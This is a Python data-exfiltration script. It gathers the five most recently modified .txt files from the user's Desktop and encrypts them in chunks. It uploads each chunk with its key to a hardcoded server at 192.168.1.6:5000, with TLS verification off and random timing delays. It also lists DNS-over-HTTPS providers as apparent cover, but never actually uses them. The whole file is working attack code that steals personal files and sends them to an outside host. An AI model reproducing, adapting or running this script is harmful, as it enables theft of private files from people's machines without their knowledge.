import os, glob, requests, logging, struct, base64, random, time, httpx
from datetime import datetime
import urllib3
import win32com.client
from colorama import Fore, Style, init
from cryptography.fernet import Fernet

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

key = Fernet.generate_key()
cipher_suite = Fernet(key)
CHUNK_SIZE = 1024 * 50  # 50 KB per chunk
DOH_URLS = [
    "https://cloudflare-dns.com/dns-query",
    "https://dns.google/dns-query",
    "https://dns.quad9.net/dns-query",
    "https://dns.cloudflare.com/dns-query"
]

def get_recent_txt_files(directory, number_of_files):
    print(f"{Fore.CYAN}[ * ] Fetching recent .txt files from {directory}")
    txt_files = glob.glob(os.path.join(directory, '*.txt'))
    txt_files.sort(key=lambda x: os.path.getmtime(x), reverse=True)
    
    recent_files = txt_files[:number_of_files]
    print(f"{Fore.GREEN}[ + ] Found recent .txt files: {recent_files}")
    return recent_files

def send_file_in_chunks(file_path, server_ip, cipher_suite, key):
    try:
        file_size = os.path.getsize(file_path)
    except FileNotFoundError:
        print(f"{Fore.RED}[ ! ] File not found: {file_path}")
        return
    
    file_name = os.path.basename(file_path)
    server_url = f"https://{server_ip}:5000/upload"
    
    with open(file_path, 'rb') as f:
        for chunk_number in range(0, file_size, CHUNK_SIZE):
            chunk_data = f.read(CHUNK_SIZE)
            encrypted_chunk = cipher_suite.encrypt(chunk_data)
            doh_url = random.choice(DOH_URLS)
            files = {
                'file': (file_name, encrypted_chunk),
                'chunk_number': (None, str(chunk_number)),
                'total_size': (None, str(file_size)),
                'key': (None, base64.urlsafe_b64encode(key).decode('utf-8'))
            }
            print(f"{Fore.CYAN}[ * ] Sending chunk {chunk_number // CHUNK_SIZE} of file {file_name}")
            print(f"{Fore.CYAN}[ + ] Chunk size: {len(encrypted_chunk)} bytes, Memory address: {hex(id(encrypted_chunk))}")
            print(f"{Fore.CYAN}[ * ] Using DoH provider: {doh_url}\n")
            
            try:
                response = requests.post(server_url, files=files, verify=False)
                if response.status_code == 200:
                    print(f"{Fore.GREEN}[ + ] Successfully uploaded chunk {chunk_number // CHUNK_SIZE} of {file_name}")
                else:
                    print(f"{Fore.RED}[ ! ] Failed to upload chunk {chunk_number // CHUNK_SIZE} of {file_name}")
                    break
            except requests.RequestException as e:
                print(f"{Fore.RED}[ ! ] Error during upload: {e}")
            time.sleep(random.uniform(0.5, 2.0))

if __name__ == "__main__":
    desktop_dir = os.path.join(os.path.expanduser("~"), "Desktop")  
    recent_txt_files = get_recent_txt_files(desktop_dir, 5) 
    
    domain = "everythingBlackkk.com" 
    server_ip = "192.168.1.6"  
    
    if server_ip:
        print(f"{Fore.GREEN}[ + ] Resolved server IP: {server_ip}")
        for recent_file in recent_txt_files:
            send_file_in_chunks(recent_file, server_ip, cipher_suite, key)
    else:
        print(f"{Fore.RED}[ ! ] Failed to resolve server IP using DoH providers")
